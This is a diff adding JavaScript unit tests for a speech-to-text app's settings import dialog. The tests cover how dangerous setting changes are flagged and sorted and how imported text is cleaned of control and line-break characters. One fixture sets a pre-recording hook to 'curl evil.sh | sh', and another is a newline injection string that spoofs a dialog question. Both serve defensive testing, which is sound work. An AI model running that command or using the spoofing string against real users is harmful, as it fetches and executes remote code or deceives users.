@@ -179,10 +179,151 @@ test('import diff summary and dangerous rows', () => {
   assert.equal(Model.diffSummary(null), 'Nothing to import');
 });
 
+test('settingsRows renders EVERY settings change, dangerous first, redaction-safe, capped with an overflow line', () => {
+  const diff = {settings_change: [
+    {path: 'audio.device', old: 'default', new: 'yeti', dangerous: false},
+    {path: 'output.pre_recording_command', old: '', new: 'curl evil.sh | sh', dangerous: true},
+    {path: 'whisper.remote_api_key', dangerous: true, redacted: true, old_set: true, new_set: true},
+    {path: 'whisper.model', old: 'base', new: 'tiny', dangerous: false},
+  ]};
+  const rows = Model.settingsRows(diff);
+  assert.equal(rows.length, 4, 'nothing collapses into a bare count');
+  same(rows.map(r => r.dangerous), [true, true, false, false], 'dangerous rows sort first');
+  assert.equal(rows[0].text, 'output.pre_recording_command:  → curl evil.sh | sh');
+  assert.equal(rows[1].text, 'whisper.remote_api_key will be replaced');
+  assert.doesNotMatch(rows[1].text, /undefined|→/, 'a redacted row never gets a value formatter');
+  assert.equal(rows[2].text, 'audio.device: default → yeti');
+  assert.equal(rows[3].text, 'whisper.model: base → tiny');
+  for (const r of rows) assert.equal(r.overflow, false);
+
+  // Arbitrary length: the bridge's dangerous set grew, the card must not.
+  const many = [];
+  for (let i = 0; i < 30; i++) many.push({path: 'meeting.hook' + i, old: 'a', new: 'b', dangerous: i < 3});
+  const capped = Model.settingsRows({settings_change: many}, 12);
+  assert.equal(capped.length, 13, '12 rows plus one overflow line');
+  assert.equal(capped[12].overflow, true);
+  assert.equal(capped[12].text, 'and 18 more changes');
+  assert.equal(capped.slice(0, 3).every(r => r.dangerous), true, 'dangerous rows are never the ones cut');
+  assert.equal(Model.settingsRows({settings_change: many.slice(0, 13)}, 12)[12].text, 'and 1 more change');
+  same(Model.settingsRows(null), []);
+  same(Model.settingsRows({}), []);
+  assert.equal(Model.settingsRows({settings_change: [null, {path: 'a', old: 1, new: 2}]}).length, 1, 'junk rows are dropped');
+});
+
+test('importConfirmation tiers the dialog and only claims an acknowledgement it could show', () => {
+  const one = Model.importConfirmation('bundle.json', {settings_change: [{path: 'engine', old: 'a', new: 'b', dangerous: true}]});
+  assert.match(one.message, /^Import bundle\.json\?/);
+  assert.match(one.message, /⚠ engine: a → b/);
+  assert.equal(one.confirmText, 'Import anyway');
+  assert.equal(one.accept, true);
+  assert.equal(one.dangerous, 1);
+
+  const clean = Model.importConfirmation('b.json', {vocab_add: ['x'], settings_change: [{path: 'p', old: 1, new: 2, dangerous: false}]});
+  assert.equal(clean.confirmText, 'Import');
+  assert.equal(clean.accept, false, 'no dangerous rows: accept_dangerous must stay false');
+  assert.doesNotMatch(clean.message, /⚠/);
+
+  const mid = [];
+  for (let i = 0; i < 15; i++) mid.push({path: 'meeting.hook' + i, old: 'a', new: 'b', dangerous: true});
+  const midConfirm = Model.importConfirmation('b.json', {settings_change: mid});
+  assert.equal(midConfirm.accept, true, 'every path is still named');
+  for (let i = 0; i < 15; i++) assert.match(midConfirm.message, new RegExp('meeting\\.hook' + i + '\\b'));
+
+  const huge = [];
+  for (let i = 0; i < 25; i++) huge.push({path: 'meeting.hook' + i, old: 'a', new: 'b', dangerous: true});
+  const hugeConfirm = Model.importConfirmation('b.json', {settings_change: huge});
+  assert.equal(hugeConfirm.accept, false, 'unreviewable: the bridge refusal must do the work');
+  assert.match(hugeConfirm.message, /25 dangerous changes/);
+
+  // A redacted dangerous row is described, never formatted.
+  const secret = Model.importConfirmation('b.json', {settings_change: [{path: 'whisper.remote_api_key', dangerous: true, redacted: true, old_set: true, new_set: true}]});
+  assert.match(secret.message, /whisper\.remote_api_key will be replaced/);
+  assert.doesNotMatch(secret.message, /undefined/);
+});
+
+test('settingsTargets is the on-screen cursor order: hidden controls are not cursor stops', () => {
+  const targets = (cfg, eng) => Model.settingsTargets(cfg, eng, (eng || 'whisper') + '.model');
+  const base = targets({}, 'whisper');
+  assert.equal(base[0], 'engine');
+  assert.equal(base[1], 'whisper.model', 'the model path is the caller\'s, not hard-coded');
+  assert.equal(targets({}, 'parakeet')[1], 'parakeet.model');
+  for (const k of ['gpu.device', 'gpu.enable', 'gpu.disable']) assert.ok(base.indexOf(k) >= 0, k);
+
+  // engine !== whisper drops the language field and the whole remote block.
+  const other = targets({'whisper.remote_api_key_set': true}, 'parakeet');
+  for (const k of ['whisper.language', 'whisper.remote_endpoint', 'whisper.remote_model', 'whisper.remote_timeout_secs', 'remote.clear'])
+    assert.ok(other.indexOf(k) < 0, k + ' is whisper-only');
+
+  // audio.feedback.enabled gates its Row; the fallback is true.
+  assert.ok(base.indexOf('audio.feedback.theme') >= 0 && base.indexOf('audio.feedback.volume') >= 0);
+  const noFeedback = targets({'audio.feedback.enabled': false}, 'whisper');
+  assert.ok(noFeedback.indexOf('audio.feedback.theme') < 0 && noFeedback.indexOf('audio.feedback.volume') < 0);
+  assert.ok(noFeedback.indexOf('audio.feedback.enabled') >= 0, 'the toggle itself is always reachable');
+
+  // vad.enabled gates its Row; the fallback is false.
+  assert.ok(base.indexOf('vad.threshold') < 0 && base.indexOf('vad.model') < 0);
+  const vad = targets({'vad.enabled': true}, 'whisper');
+  assert.ok(vad.indexOf('vad.threshold') >= 0 && vad.indexOf('vad.model') >= 0);
+
+  // remote.clear needs whisper AND a stored key.
+  assert.ok(base.indexOf('remote.clear') < 0);
+  assert.ok(targets({'whisper.remote_api_key_set': true}, 'whisper').indexOf('remote.clear') >= 0);
+
+  // Order is stable and free of duplicates whatever is hidden.
+  for (const cfg of [{}, {'vad.enabled': true}, {'audio.feedback.enabled': false}, {'vad.enabled': true, 'whisper.remote_api_key_set': true}]) {
+    for (const eng of ['whisper', 'parakeet']) {
+      const list = targets(cfg, eng);
+      assert.equal(new Set(list).size, list.length, 'no duplicates');
+      assert.equal(list.indexOf('engine'), 0);
+      assert.equal(list[list.length - 1], 'gpu.disable');
+    }
+  }
+  assert.equal(Model.settingsTargets(null, null, null)[1], 'whisper.model', 'defaults do not throw');
+});
+
 test('sanitize strips control and bidi characters and caps length', () => {
   assert.equal(Model.sanitize('a\u202eb\u0000c'), 'abc');
   assert.equal(Model.sanitize('x'.repeat(300)).length, 200);
   assert.equal(Model.sanitize(null), '');
+});
+
+// ---- F4: line breaks are an injection vector, not just controls/bidi -----
+//
+// ConfirmDialog renders `message` with wrapMode WordWrap, so PlainText stops
+// HTML but NOT a line break: an imported phrase containing newlines can push
+// the real question off the top of the card and render its own question
+// directly above the Cancel/Remove buttons.
+
+test('sanitize flattens every layout-injection codepoint, one case per codepoint', () => {
+  const cases = [
+    ['LF', '\u000a'], ['CR', '\u000d'], ['CRLF', '\u000d\u000a'], ['TAB', '\u0009'],
+    ['U+2028 LINE SEPARATOR', '\u2028'], ['U+2029 PARAGRAPH SEPARATOR', '\u2029'],
+    ['U+200B ZERO WIDTH SPACE', '\u200b'], ['U+00AD SOFT HYPHEN', '\u00ad'],
+    ['U+FEFF BOM', '\ufeff'], ['U+202E RLO', '\u202e'], ['U+200E LRM', '\u200e'],
+    ['U+2066 LRI', '\u2066'], ['U+0007 BEL', '\u0007'], ['U+007F DEL', '\u007f'],
+  ];
+  for (const [name, ch] of cases) {
+    const out = Model.sanitize('a' + ch + 'b');
+    assert.doesNotMatch(out, /[\r\n\u2028\u2029\u200b\u00ad\ufeff\u202a-\u202e\u200e\u200f\u2066-\u2069\u0000-\u001f\u007f]/, name + ' survives sanitize');
+    assert.ok(out === 'ab' || out === 'a b', name + ' became ' + JSON.stringify(out));
+  }
+  // The actual attack shape: a fake question after a wall of breaks.
+  const attack = 'coffee\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nDelete your whole config?';
+  const clean = Model.sanitize(attack, 200);
+  assert.doesNotMatch(clean, /[\r\n]/, 'no line break survives');
+  assert.equal(clean, 'coffee Delete your whole config?', 'whitespace runs collapse to one space');
+  assert.equal(Model.sanitize('a \t\r\n  b'), 'a b');
+  assert.equal(Model.sanitize('  padded  '), ' padded ', 'only runs collapse; no surprise trimming');
+});
+
+test('sanitizeMessage keeps the panel\'s own literal newline while stripping injected controls', () => {
+  // Panel.qml's model-delete copy uses a deliberate \n in its static text.
+  const staticCopy = 'Delete base from disk?\nIt can be downloaded again later.';
+  assert.equal(Model.sanitizeMessage(staticCopy, 600), staticCopy, 'an intentional \\n keeps working');
+  assert.doesNotMatch(Model.sanitizeMessage('a\u202eb\u0007c\u2028d'), /[\u202e\u0007\u2028]/);
+  assert.equal(Model.sanitizeMessage('a\tb\rc'), 'a b c', 'tab and CR are still flattened');
+  assert.equal(Model.sanitizeMessage('x'.repeat(900)).length, 600);
+  assert.equal(Model.sanitizeMessage(null), '');
 });
 
 test('Model.js never touches Qt', () => {
